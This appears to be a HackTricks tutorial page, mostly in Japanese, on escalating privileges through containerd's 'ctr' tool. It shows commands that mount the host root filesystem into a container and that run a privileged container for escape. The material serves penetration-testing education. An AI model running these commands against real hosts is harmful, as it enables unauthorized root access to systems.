# Containerd (ctr) Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## Basic information

以下のリンクにアクセスして、**containerd と `ctr` がコンテナスタック内でどの位置付けになるか**を確認してください:


{{#ref}}
container-security/runtimes-and-engines.md
{{#endref}}

## PE 1

ホストに `ctr` コマンドが存在することがわかった場合:
```bash
which ctr
/usr/bin/ctr
```
イメージを一覧表示できます:
```bash
ctr image list
REF                                  TYPE                                                 DIGEST                                                                  SIZE      PLATFORMS   LABELS
registry:5000/alpine:latest application/vnd.docker.distribution.manifest.v2+json sha256:0565dfc4f13e1df6a2ba35e8ad549b7cb8ce6bccbc472ba69e3fe9326f186fe2 100.1 MiB linux/amd64 -
registry:5000/ubuntu:latest application/vnd.docker.distribution.manifest.v2+json sha256:ea80198bccd78360e4a36eb43f386134b837455dc5ad03236d97133f3ed3571a 302.8 MiB linux/amd64 -
```
そして、**ホストのルートフォルダーをマウントして、それらのイメージのいずれかを実行します**:
```bash
ctr run --mount type=bind,src=/,dst=/,options=rbind -t registry:5000/ubuntu:latest ubuntu bash
```
## PE 2

privileged な container を実行し、そこから escape します。\
privileged な container は次のように実行できます:
```bash
ctr run --privileged --net-host -t registry:5000/modified-ubuntu:latest ubuntu bash
```
その後、以下のページで説明されているいくつかの techniques を使用して、**privileged capabilities を悪用してそこから escape**できます。


{{#ref}}
container-security/
{{#endref}}

{{#include ../../banners/hacktricks-training.md}}
